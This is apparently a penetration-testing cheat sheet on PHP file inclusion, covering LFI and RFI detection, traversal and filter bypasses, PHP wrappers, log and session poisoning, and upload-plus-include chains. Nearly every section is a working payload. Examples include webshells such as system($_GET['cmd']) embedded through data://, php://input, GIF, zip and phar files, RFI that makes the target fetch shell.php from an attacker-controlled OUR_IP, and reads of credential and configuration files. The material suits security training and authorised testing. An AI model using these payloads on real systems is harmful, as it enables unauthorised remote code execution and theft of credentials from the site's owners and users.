---
title: "File Inclusion"
description: "LFI, RFI, log poisoning, and PHP wrappers."
sidebar:
  order: 8
  label: "File Inclusion"
---
> LFI/RFI: local or remote file inclusion through unsanitized parameters. Scales from file reading to RCE using PHP wrappers, log poisoning, and upload+include.

---


## Detection and Key Files

```bash
# Basic detection — absolute paths
?language=/etc/passwd
?language=C:\Windows\boot.ini

# Detection with path traversal
?language=../../../../etc/passwd
?language=../../../../Windows/win.ini

# Frequently read files in LFI
/etc/passwd                           # system users
/etc/hosts                            # internal hosts
/etc/hostname
/proc/self/environ                    # environment variables (User-Agent included)
/proc/self/cmdline                    # current process
/proc/net/fib_trie                    # internal IPs
/var/www/html/config.php              # DB credentials
/etc/apache2/apache2.conf             # Apache config
/etc/nginx/nginx.conf                 # Nginx config
/etc/php/7.4/apache2/php.ini          # PHP configuration (test versions 7.x, 8.x)
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

---

## Path Traversal

```bash
# Direct absolute path
?language=/etc/passwd

# Relative path traversal (preferred — works even with directory prefixes)
?language=../../../../etc/passwd

# Many ../ do not break anything — they reach the root and stay there
?language=../../../../../../../../../../../etc/passwd

# Directory prefix in code (include("./lang/" . $param))
# Use / at the beginning so the prefix is treated as a directory
?language=/../../../etc/passwd
```

---

## Filter Bypasses

### Non-Recursive Filter (`str_replace('../', '', input)`)

```bash
# ....// -> after removing ../, ../ remains
?language=....//....//....//etc/passwd

# Variants
?language=..././..././..././etc/passwd
?language=....\/....\/....\/etc/passwd
```

### URL Encoding

```bash
# . = %2e / = %2f
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding (for WAFs that decode once)
?language=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Approved Path Bypass (regex `^./languages/`)

```bash
# Start with approved path, then traversal
?language=./languages/../../../../etc/passwd
```

### Extension Added by Code (`include($param . ".php")`)

```bash
# Null byte — PHP < 5.5 (obsolete in modern PHP)
?language=../../../../etc/passwd%00

# Path truncation — PHP < 5.3 (string max 4096 chars)
# The appended .php is truncated upon exceeding 4096 chars
?language=non_existing/../../../etc/passwd/./././././././[...repeat ~2048 times]
# Automatically generate:
echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

---

## PHP Wrappers

### Reading PHP Source Code (base64 filter)

```bash
# Read source code of a PHP file
?language=php://filter/read=convert.base64-encode/resource=config
# If the extension .php is added automatically, resource=config -> config.php

# Decode locally
echo 'PD9waHAK...' | base64 -d

# Verify allow_url_include in php.ini
curl "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | grep -a 'allow_url_include'
# Decode output and grep:
echo '...' | base64 -d | grep allow_url_include
```

### RCE — data Wrapper (requires `allow_url_include = On`)

```bash
# Encode webshell in base64
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Inject via data wrapper
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# With curl
curl -s 'http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

### RCE — php://input Wrapper (POST, requires `allow_url_include = On`)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://target/index.php?language=php://input&cmd=id"
```

### RCE — expect Wrapper (requires `expect` extension installed)

```bash
# Verify if expect is available
echo '...' | base64 -d | grep expect

# Execute command directly
?language=expect://id
curl -s "http://target/index.php?language=expect://id"
```

---

## RFI — Remote File Inclusion

```bash
# Verify RFI (test local URL first — avoids firewall)
?language=http://127.0.0.1:80/index.php

# RFI via HTTP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
?language=http://OUR_IP/shell.php&cmd=id

# RFI via FTP (useful if HTTP is blocked)
sudo python -m pyftpdlib -p 21
?language=ftp://OUR_IP/shell.php&cmd=id
# With credentials:
?language=ftp://user:pass@OUR_IP/shell.php&cmd=id

# RFI via SMB (Windows — does not need allow_url_include)
impaket-smbserver -smb2support share $(pwd)
?language=\\OUR_IP\share\shell.php&cmd=whoami
```

---

## Log Poisoning → RCE

### Apache/Nginx access.log via User-Agent

```bash
# Step 1: verify log access
?language=/var/log/apache2/access.log
?language=/var/log/nginx/access.log
?language=../../../../var/log/apache2/access.log

# Step 2: inject PHP in User-Agent (via Burp or curl)
curl -s "http://target/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Alternative with file:
echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > poison
curl -s "http://target/index.php" -H @poison

# Step 3: include the log + execute command
?language=/var/log/apache2/access.log&cmd=id
```

### Log Paths

```bash
# Apache
/var/log/apache2/access.log     # Linux
C:\xampp\apache\logs\access.log # Windows

# Nginx
/var/log/nginx/access.log       # Linux
C:\nginx\log\access.log         # Windows

# Other poisonable logs
/var/log/sshd.log               # SSH: use malicious user in login
/var/log/vsftpd.log             # FTP: malicious user
/var/log/mail                   # Mail: send email with PHP code

# /proc (if no access to logs)
/proc/self/environ              # User-Agent in env
/proc/self/fd/N                 # FDs of the process (N: 0-50)
```

### Session Poisoning (PHP)

```bash
# Step 1: find session file
# PHPSESSID cookie -> /var/lib/php/sessions/sess_<PHPSESSID>
# Example: PHPSESSID=abc123 -> /var/lib/php/sessions/sess_abc123

# Step 2: read session file via LFI
?language=/var/lib/php/sessions/sess_abc123

# Step 3: inject PHP in a parameter stored in session
?language=<?php system($_GET['cmd']); ?>
# URL encoded: %3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# Step 4: include session + execute
?language=/var/lib/php/sessions/sess_abc123&cmd=id

# Session paths
/var/lib/php/sessions/          # Linux
C:\Windows\Temp\                # Windows
```

---

## LFI + File Upload → RCE

### GIF Webshell (Preferred Method)

```bash
# Create malicious image with PHP
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# GIF8 = magic bytes to pass file type validation

# Upload via profile/avatar form
# Obtain uploaded file path from the img src in the HTML:
# <img src="/profile_images/shell.gif">

# Include via LFI + execute
?language=./profile_images/shell.gif&cmd=id
```

### Zip Wrapper

```bash
# Create webshell + compress as image
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Include with zip wrapper
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
# %23 = # (separator of the file inside the zip)
```

### Phar Wrapper

```php
// shell.php — generate phar file
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

```bash
# Compile and rename
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Include with phar wrapper
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
# %2F = / (sub-file separator)
```

---

## Automated Fuzzing

```bash
# Fuzzing LFI parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://target/index.php?FUZZ=value' -fs 2287

# Fuzzing LFI payloads
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://target/index.php?language=FUZZ' -fs 2287

# Fuzzing available PHP files
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://target/FUZZ.php
```

---

## PHP Functions Table

| Function | Reads | Executes | Remote URL |
|---------|-----|---------|-----------|
| `include()/include_once()` | ✅ | ✅ | ✅ |
| `require()/require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()/file()` | ✅ | ❌ | ❌ |

> Only functions with **Executes=✅** are exploitable for RCE via inclusion.

---

## Pitfalls / Gotchas

- **Absolute path does not work:** the code appends a directory prefix. Use `../../../../` instead of `/etc/passwd` directly.
- **`.php` extension automatically appended:** use wrappers (`php://filter`) which are unaffected, or null byte (PHP < 5.5).
- **`allow_url_include = Off`:** `data://` and `php://input` will not work. Verify the `php.ini` configuration first using the filter wrapper.
- **Log poisoning — unreadable log:** Apache logs require root/adm. Try Nginx first (readable by www-data).
- **Very large log:** including huge log files can crash the server in production. Be cautious.
- **Session poisoning — overwriting:** the session is overwritten with each request. Chain the include + cmd in the same request.
- **GIF webshell with extension validation:** if the app rejects `.gif`, try `.jpg` or `.png`. The magic bytes are key if it validates content.
- **Zip wrapper disabled:** it is not enabled by default. If it fails, use the direct GIF method.
- **SMB RFI on Linux:** SMB via UNC paths only works on Windows. On Linux, use HTTP or FTP.
- **Fuzzing with LFI-Jhaddix:** large wordlist (~4k entries). Calibrate using `-fs` to avoid false positives.
- **`#` in zip wrapper:** the `#` must be URL-encoded as `%23` in the URL, or the browser will interpret it as a fragment.

---

## Related Cheatsheets

- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — upload webshells to combine with LFI
- [Attacking Web Applications with Ffuf](/en/metodologias/recon/attacking-web-applications-ffuf/) — fuzzing parameters and LFI payloads
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercept and modify User-Agent for log poisoning
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells to scale from LFI webshell
- [Web Attacks](/en/metodologias/web/web-attacks/) — XXE also supports PHP wrappers and SSRF via RFI
